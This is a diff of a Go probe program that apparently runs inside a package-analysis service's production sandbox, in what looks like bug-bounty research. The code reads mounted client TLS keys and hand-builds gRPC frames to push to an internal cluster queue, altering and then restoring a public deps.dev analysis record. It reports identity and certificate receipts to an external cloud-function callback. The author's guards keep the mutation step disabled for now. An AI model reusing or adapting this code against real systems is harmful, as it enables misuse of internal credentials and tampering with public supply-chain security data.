@@ -1,6 +1,7 @@
-// Command queue-receipt performs one fixed, researcher-owned Queue cleanup
-// action from the exact production Capslock compiler lane and emits bounded
-// receipts to one pinned callback.
+// Command queue-roundtrip performs one mutation and one cleanup against a
+// fresh researcher-owned package-analysis record from the exact production
+// Capslock compiler lane. Every action and public transition is pinned and
+// emitted as a bounded receipt to one pinned callback.
 package main
 
 import (
@@ -34,29 +35,36 @@ var callbackURLSHA256 string
 
 const (
 	moduleName       = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion     = "v0.0.121-codex"
-	expectedOrigin   = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.121-codex"
-	expectedAgent    = "go-cgo-pkgsite-probe-v121-queue-receipt"
-	targetCoordinate = "github.com/benr00t3d/go-byteman-crosswrite-canary@v0.0.5"
+	probeVersion     = "v0.0.124-codex"
+	expectedOrigin   = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.124-codex"
+	expectedAgent    = "go-cgo-pkgsite-probe-v124-owned-roundtrip"
+	targetCoordinate = "github.com/benr00t3d/go-byteman-crosswrite-canary@v0.0.8"
 	queueName        = "capslock-capability-result"
-	queueSource      = "robert-owned-v121-clean-rollback"
+	mutationSource   = "robert-owned-v124-structured-mutation"
+	cleanupSource    = "robert-owned-v124-clean-rollback"
 	queueMethod      = "/sos.queue.Queue/Push"
 	serviceHost      = "talisman-core.default.svc.cluster.local"
 	servicePort      = 9000
 	tlsServerName    = "localhost"
 
-	analysisURL        = "https://deps.dev/_/s/go/p/github.com%2Fbenr00t3d%2Fgo-byteman-crosswrite-canary/v/v0.0.5/analysis"
-	cleanSHA256        = "b29cc76a863e9bb78a74e9e417b4914d3c50c9271b928a02e8accd859903a6ec"
-	alteredSHA256      = "8fa1ab0a982e0ac97555488c716fb232e1a83cb3214e1be3a71ff22e8a3d9e13"
-	expectedPushBytes  = 136
-	expectedPushSHA256 = "5fbe64bfe43cc444010a37a6500c7b206d654d34e111c7128bd4ce8b2cabd9f2"
+	analysisURL   = "https://deps.dev/_/s/go/p/github.com%2Fbenr00t3d%2Fgo-byteman-crosswrite-canary/v/v0.0.8/analysis"
+	cleanSHA256   = "14d798f2aadfed6f6a1eb6951221daa65d5e132d402cf9fa35952c0adc9857dd"
+	mutatedSHA256 = "0000000000000000000000000000000000000000000000000000000000000000"
+
+	// These remain deliberately invalid until v123 supplies the exact nested
+	// Capability element descriptor and the resulting request is independently
+	// decoded and pinned. validateStaticPins prevents any RPC before then.
+	mutationPushBytes  = 0
+	mutationPushSHA256 = "0000000000000000000000000000000000000000000000000000000000000000"
+	cleanupPushBytes   = 136
+	cleanupPushSHA256  = "225fccc94424f1226bb7915a24d71229e09ac4a8e268f22892ffe7b6a0801874"
 
 	clientCertificatePath = "/etc/tls/client/tls.crt"
 	clientKeyPath         = "/etc/tls/client/tls.key"
 	serverPoolPath        = "/etc/tls/server-pool/server-tls-pool.pem"
 
 	precheckSamples    = 5
-	cleanSamples       = 21
+	convergenceSamples = 21
 	pollInterval       = 2 * time.Second
 	pollTimeout        = 15 * time.Minute
 	callbackTimeout    = 20 * time.Second
@@ -146,40 +154,47 @@ type queueReceipt struct {
 	DurationMS         int64        `json:"duration_ms,omitempty"`
 }
 
-type postcheckReceipt struct {
-	Attempted   bool           `json:"attempted"`
-	Samples     []publicSample `json:"samples"`
-	CleanStreak int            `json:"clean_streak"`
-	Converged   bool           `json:"converged"`
-	FinalBody   string         `json:"final_body,omitempty"`
-	FinalSHA256 string         `json:"final_sha256,omitempty"`
-	Error       string         `json:"error,omitempty"`
+type convergenceReceipt struct {
+	Attempted     bool           `json:"attempted"`
+	Samples       []publicSample `json:"samples"`
+	ExpectedState string         `json:"expected_state"`
+	ExactStreak   int            `json:"exact_streak"`
+	Converged     bool           `json:"converged"`
+	FinalBody     string         `json:"final_body,omitempty"`
+	FinalSHA256   string         `json:"final_sha256,omitempty"`
+	Error         string         `json:"error,omitempty"`
 }
 
 type report struct {
-	Schema                string           `json:"schema"`
-	Phase                 string           `json:"phase"`
-	Module                string           `json:"module"`
-	Version               string           `json:"version"`
-	Target                string           `json:"target"`
-	ExpectedAlteredSHA256 string           `json:"expected_altered_sha256"`
-	ExpectedCleanSHA256   string           `json:"expected_clean_sha256"`
-	StartedUTC            string           `json:"started_utc"`
-	FinishedUTC           string           `json:"finished_utc,omitempty"`
-	Identity              identityReceipt  `json:"identity"`
-	Precheck              []publicSample   `json:"precheck"`
-	PrecheckState         string           `json:"precheck_state"`
-	PreflightReportSHA256 string           `json:"preflight_report_sha256,omitempty"`
-	Queue                 queueReceipt     `json:"queue"`
-	QueueReportSHA256     string           `json:"queue_report_sha256,omitempty"`
-	QueueCallbackOK       bool             `json:"queue_callback_ok"`
-	Postcheck             postcheckReceipt `json:"postcheck"`
-	Outcome               string           `json:"outcome"`
-	Error                 string           `json:"error,omitempty"`
+	Schema                   string             `json:"schema"`
+	Phase                    string             `json:"phase"`
+	Module                   string             `json:"module"`
+	Version                  string             `json:"version"`
+	Target                   string             `json:"target"`
+	ExpectedMutatedSHA256    string             `json:"expected_mutated_sha256"`
+	ExpectedCleanSHA256      string             `json:"expected_clean_sha256"`
+	StartedUTC               string             `json:"started_utc"`
+	FinishedUTC              string             `json:"finished_utc,omitempty"`
+	Identity                 identityReceipt    `json:"identity"`
+	Precheck                 []publicSample     `json:"precheck"`
+	PrecheckState            string             `json:"precheck_state"`
+	PreflightReportSHA256    string             `json:"preflight_report_sha256,omitempty"`
+	Mutation                 queueReceipt       `json:"mutation"`
+	MutationReportSHA256     string             `json:"mutation_report_sha256,omitempty"`
+	MutationCallbackOK       bool               `json:"mutation_callback_ok"`
+	MutationPublic           convergenceReceipt `json:"mutation_public"`
+	MutationPublicSHA256     string             `json:"mutation_public_report_sha256,omitempty"`
+	MutationPublicCallbackOK bool               `json:"mutation_public_callback_ok"`
+	Cleanup                  queueReceipt       `json:"cleanup"`
+	CleanupReportSHA256      string             `json:"cleanup_report_sha256,omitempty"`
+	CleanupCallbackOK        bool               `json:"cleanup_callback_ok"`
+	CleanupPublic            convergenceReceipt `json:"cleanup_public"`
+	Outcome                  string             `json:"outcome"`
+	Error                    string             `json:"error,omitempty"`
 }
 
 func main() {
-	if validateRuntimeConfiguration() != nil || len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
+	if validateStaticPins() != nil || validateRuntimeConfiguration() != nil || len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
 		return
 	}
 	origin := filepath.Clean(os.Args[3])
@@ -193,12 +208,13 @@ func main() {
 
 	started := time.Now()
 	receipt := report{
-		Schema: "owned-queue-clean-receipt/v1", Phase: "final", Module: moduleName,
+		Schema: "owned-queue-roundtrip/v1", Phase: "final", Module: moduleName,
 		Version: probeVersion, Target: targetCoordinate,
-		ExpectedAlteredSHA256: alteredSHA256, ExpectedCleanSHA256: cleanSHA256,
+		ExpectedMutatedSHA256: mutatedSHA256, ExpectedCleanSHA256: cleanSHA256,
 		StartedUTC: started.UTC().Format(time.RFC3339Nano),
 		Identity:   inspectIdentity(origin), Precheck: []publicSample{},
-		Queue: emptyQueueReceipt(), Postcheck: postcheckReceipt{Samples: []publicSample{}},
+		Mutation: emptyQueueReceipt(mutationSource), Cleanup: emptyQueueReceipt(cleanupSource),
+		MutationPublic: emptyConvergenceReceipt("mutated"), CleanupPublic: emptyConvergenceReceipt("clean"),
 	}
 
 	certIdentity, certErr := readClientCertificateIdentity()
@@ -216,13 +232,8 @@ func main() {
 		finishAndSubmit(&receipt)
 		return
 	}
-	if state == "clean" {
-		receipt.Outcome = "noop_already_clean"
-		finishAndSubmit(&receipt)
-		return
-	}
-	if state != "altered" {
-		receipt.Outcome, receipt.Error = "aborted_before_internal_rpc", "precheck_not_exact_altered"
+	if state != "clean" {
+		receipt.Outcome, receipt.Error = "aborted_before_internal_rpc", "precheck_not_exact_clean"
 		finishAndSubmit(&receipt)
 		return
 	}
@@ -238,32 +249,54 @@ func main() {
 	}
 	receipt.PreflightReportSHA256 = preflightHash
 
-	receipt.Queue = runQueuePush()
-	queueReport := receipt
-	queueReport.Phase = "queue"
-	queueReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	queueHash, callbackErr := submitPhase("queue", queueReport)
-	receipt.QueueReportSHA256 = queueHash
-	receipt.QueueCallbackOK = callbackErr == nil
+	mutationBody, err := buildMutationPush()
+	if err != nil {
+		receipt.Outcome, receipt.Error = "aborted_before_internal_rpc", "mutation_descriptor_not_pinned"
+		finishAndSubmit(&receipt)
+		return
+	}
+	receipt.Mutation = runQueuePush(mutationBody, mutationSource, mutationPushBytes, mutationPushSHA256)
+	mutationReport := receipt
+	mutationReport.Phase = "mutation_queue"
+	mutationReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
+	receipt.MutationReportSHA256, err = submitPhase("mutation_queue", mutationReport)
+	receipt.MutationCallbackOK = err == nil
 
-	receipt.Postcheck = runPostcheck()
-	if receipt.Queue.Verified && receipt.QueueCallbackOK && receipt.Postcheck.Converged {
-		receipt.Outcome = "queue_verified_and_clean_converged"
-	} else if receipt.Postcheck.Converged {
-		receipt.Outcome = "clean_converged_queue_receipt_incomplete"
-		if !receipt.Queue.Verified {
-			receipt.Error = "queue_response_not_verified"
-		} else {
-			receipt.Error = "queue_callback_failed"
-		}
+	receipt.MutationPublic = runConvergence("mutated", precheckSamples)
+	mutationPublicReport := receipt
+	mutationPublicReport.Phase = "mutation_public"
+	mutationPublicReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
+	receipt.MutationPublicSHA256, err = submitPhase("mutation_public", mutationPublicReport)
+	receipt.MutationPublicCallbackOK = err == nil
+
+	cleanupBody := buildCleanPush()
+	receipt.Cleanup = runQueuePush(cleanupBody, cleanupSource, cleanupPushBytes, cleanupPushSHA256)
+	cleanupReport := receipt
+	cleanupReport.Phase = "cleanup_queue"
+	cleanupReport.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
+	receipt.CleanupReportSHA256, err = submitPhase("cleanup_queue", cleanupReport)
+	receipt.CleanupCallbackOK = err == nil
+	receipt.CleanupPublic = runConvergence("clean", precheckSamples+len(receipt.MutationPublic.Samples))
+
+	if receipt.Mutation.Verified && receipt.MutationCallbackOK && receipt.MutationPublic.Converged && receipt.MutationPublicCallbackOK &&
+		receipt.Cleanup.Verified && receipt.CleanupCallbackOK && receipt.CleanupPublic.Converged {
+		receipt.Outcome = "owned_roundtrip_verified_and_clean_restored"
+	} else if receipt.CleanupPublic.Converged {
+		receipt.Outcome = "clean_restored_roundtrip_receipt_incomplete"
+		receipt.Error = firstNonempty(receipt.Mutation.Error, receipt.MutationPublic.Error, receipt.Cleanup.Error)
 	} else {
-		receipt.Outcome, receipt.Error = "queue_cleanup_not_converged", firstNonempty(receipt.Queue.Error, receipt.Postcheck.Error)
+		receipt.Outcome = "cleanup_not_converged"
+		receipt.Error = firstNonempty(receipt.Cleanup.Error, receipt.CleanupPublic.Error, receipt.Mutation.Error, receipt.MutationPublic.Error)
 	}
 	finishAndSubmit(&receipt)
 }
 
-func emptyQueueReceipt() queueReceipt {
-	return queueReceipt{Method: queueMethod, Queue: queueName, Source: queueSource, Target: targetCoordinate}
+func emptyQueueReceipt(source string) queueReceipt {
+	return queueReceipt{Method: queueMethod, Queue: queueName, Source: source, Target: targetCoordinate}
+}
+
+func emptyConvergenceReceipt(state string) convergenceReceipt {
+	return convergenceReceipt{ExpectedState: state, Samples: []publicSample{}}
 }
 
 func finishAndSubmit(value *report) {
@@ -293,12 +326,33 @@ func validNonce(value string) bool {
 	return true
 }
 
+func validateStaticPins() error {
+	zero := strings.Repeat("0", 64)
+	if cleanSHA256 == zero || mutatedSHA256 == zero || cleanSHA256 == mutatedSHA256 ||
+		mutationPushBytes <= 0 || mutationPushSHA256 == zero || cleanupPushBytes <= 0 || cleanupPushSHA256 == zero {
+		return errors.New("roundtrip descriptor pins incomplete")
+	}
+	mutation, err := buildMutationPush()
+	if err != nil || !matchesRequestPin(mutation, mutationPushBytes, mutationPushSHA256) {
+		return errors.New("mutation request pin mismatch")
+	}
+	if !matchesRequestPin(buildCleanPush(), cleanupPushBytes, cleanupPushSHA256) {
+		return errors.New("cleanup request pin mismatch")
+	}
+	return nil
+}
+
+func matchesRequestPin(body []byte, expectedBytes int, expectedSHA256 string) bool {
+	digest := sha256.Sum256(body)
+	return len(body) == expectedBytes && hex.EncodeToString(digest[:]) == expectedSHA256
+}
+
 func validateRuntimeConfiguration() error {
 	if !validNonce(callbackSession) || len(callbackURLSHA256) != 64 {
 		return errors.New("invalid callback identity")
 	}
 	parsed, err := url.Parse(callbackBaseURL)
-	expectedPath := "/go-cgo-v121-queue-codex/v1/session/" + callbackSession
+	expectedPath := "/go-cgo-v124-roundtrip-codex/v1/session/" + callbackSession
 	if err != nil || parsed.Scheme != "https" || parsed.Host != "us-central1-s0victim-44547.cloudfunctions.net" ||
 		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" || parsed.Fragment != "" ||
 		parsed.Path != expectedPath {
@@ -373,7 +427,7 @@ func runPrecheck() ([]publicSample, string, error) {
 	for sequence := 1; sequence <= precheckSamples; sequence++ {
 		sample, err := fetchPublic(sequence)
 		result = append(result, sample)
-		if err != nil || (sample.State != "clean" && sample.State != "altered") {
+		if err != nil || (sample.State != "clean" && sample.State != "mutated") {
 			return result, "unknown", errors.New("public_precheck_failed")
 		}
 		if sequence != precheckSamples {
@@ -389,11 +443,11 @@ func classifyPublicSamples(samples []publicSample) (string, error) {
 		return "unknown", errors.New("public_precheck_empty")
 	}
 	state := samples[0].State
-	if state != "clean" && state != "altered" {
+	if state != "clean" && state != "mutated" {
 		return "unknown", errors.New("public_precheck_failed")
 	}
 	for _, sample := range samples[1:] {
-		if sample.State != "clean" && sample.State != "altered" {
+		if sample.State != "clean" && sample.State != "mutated" {
 			return "unknown", errors.New("public_precheck_failed")
 		}
 		if sample.State != state {
@@ -403,30 +457,35 @@ func classifyPublicSamples(samples []publicSample) (string, error) {
 	return state, nil
 }
 
-func runPostcheck() postcheckReceipt {
-	result := postcheckReceipt{Attempted: true, Samples: []publicSample{}}
+func runConvergence(expectedState string, sequenceOffset int) convergenceReceipt {
+	result := emptyConvergenceReceipt(expectedState)
+	result.Attempted = true
+	if expectedState != "clean" && expectedState != "mutated" {
+		result.Error = "invalid_expected_state"
+		return result
+	}
 	deadline := time.Now().Add(pollTimeout)
 	for sequence := 1; sequence <= maximumPostSamples && time.Now().Before(deadline); sequence++ {
-		sample, err := fetchPublic(precheckSamples + sequence)
+		sample, err := fetchPublic(sequenceOffset + sequence)
 		result.Samples = append(result.Samples, sample)
-		if err != nil || (sample.State != "clean" && sample.State != "altered") {
-			result.Error = "public_postcheck_failed"
+		if err != nil || (sample.State != "clean" && sample.State != "mutated") {
+			result.Error = "public_convergence_failed"
 			return result
 		}
-		if sample.State == "clean" {
-			result.CleanStreak++
+		if sample.State == expectedState {
+			result.ExactStreak++
 			result.FinalBody, result.FinalSHA256 = sample.Body, sample.SHA256
 		} else {
-			result.CleanStreak = 0
+			result.ExactStreak = 0
 			result.FinalBody, result.FinalSHA256 = "", ""
 		}
-		if result.CleanStreak >= cleanSamples {
+		if result.ExactStreak >= convergenceSamples {
 			result.Converged = true
 			return result
 		}
 		time.Sleep(pollInterval)
 	}
-	result.Error = "public_postcheck_timeout"
+	result.Error = "public_convergence_timeout"
 	return result
 }
 
@@ -434,7 +493,7 @@ func fetchPublic(sequence int) (publicSample, error) {
 	result := publicSample{Sequence: sequence, ObservedUTC: time.Now().UTC().Format(time.RFC3339Nano), State: "unknown"}
 	parsed, _ := url.Parse(analysisURL)
 	query := parsed.Query()
-	query.Set("v121_sample", strconv.Itoa(sequence)+"-"+strconv.FormatInt(time.Now().UnixNano(), 10))
+	query.Set("v124_sample", strconv.Itoa(sequence)+"-"+strconv.FormatInt(time.Now().UnixNano(), 10))
 	parsed.RawQuery = query.Encode()
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
@@ -471,11 +530,14 @@ func fetchPublic(sequence int) (publicSample, error) {
 }
 
 func publicStateForDigest(value string) string {
+	if value == strings.Repeat("0", 64) {
+		return "unknown"
+	}
 	switch value {
 	case cleanSHA256:
 		return "clean"
-	case alteredSHA256:
-		return "altered"
+	case mutatedSHA256:
+		return "mutated"
 	default:
 		return "unknown"
 	}
@@ -509,27 +571,36 @@ func grpcFrame(payload []byte) []byte {
 }
 
 func buildCleanPush() []byte {
-	metadata := appendStringField(nil, 1, queueName)
-	metadata = appendStringField(metadata, 4, queueSource)
-	queueRequest := appendBytesField(nil, 1, metadata)
 	cleanAction := appendStringField(nil, 1, targetCoordinate)
-	result := appendBytesField(nil, 3, cleanAction)
+	return buildQueuePush(cleanupSource, cleanAction)
+}
+
+func buildMutationPush() ([]byte, error) {
+	// Intentionally unavailable until the exact v123 descriptor identifies the
+	// nested Capability message and every field used by the unique public body.
+	return nil, errors.New("mutation descriptor not pinned")
+}
+
+func buildQueuePush(source string, capabilityResultAction []byte) []byte {
+	metadata := appendStringField(nil, 1, queueName)
+	metadata = appendStringField(metadata, 4, source)
+	queueRequest := appendBytesField(nil, 1, metadata)
+	result := appendBytesField(nil, 3, capabilityResultAction)
 	pushRequest := appendBytesField(nil, 1, result)
 	return append(grpcFrame(queueRequest), grpcFrame(pushRequest)...)
 }
 
-func runQueuePush() (result queueReceipt) {
+func runQueuePush(body []byte, source string, expectedBytes int, expectedSHA256 string) (result queueReceipt) {
 	started := time.Now()
-	result = emptyQueueReceipt()
+	result = emptyQueueReceipt(source)
 	result.Attempted, result.StartedUTC = true, started.UTC().Format(time.RFC3339Nano)
 	defer func() {
 		result.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
 		result.DurationMS = time.Since(started).Milliseconds()
 	}()
-	body := buildCleanPush()
 	digest := sha256.Sum256(body)
 	result.RequestBytes, result.RequestSHA256 = len(body), hex.EncodeToString(digest[:])
-	if len(body) != expectedPushBytes || result.RequestSHA256 != expectedPushSHA256 {
+	if len(body) != expectedBytes || result.RequestSHA256 != expectedSHA256 {
 		result.Error = "queue_request_pin_mismatch"
 		return
 	}
